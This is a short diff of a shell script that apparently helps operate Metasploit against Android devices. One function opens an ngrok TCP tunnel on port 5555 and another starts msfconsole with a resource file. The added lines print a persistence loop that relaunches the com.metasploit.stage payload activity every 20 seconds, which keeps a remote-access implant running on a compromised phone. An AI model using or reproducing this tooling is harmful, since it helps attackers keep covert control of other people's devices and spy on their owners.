@@ -43,6 +43,22 @@ function sess1 {
 ngrok tcp 5555
 }
 function sess2 {
+clear
+printf "
+==========
+wakelock
+shell
+
+==========
+#!/bin/bash
+while :
+do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+sleep 20
+done
+
+==========
+
+"
 msfconsole -q -r $PREFIX/lib/config-base
 }
 function sess3 {
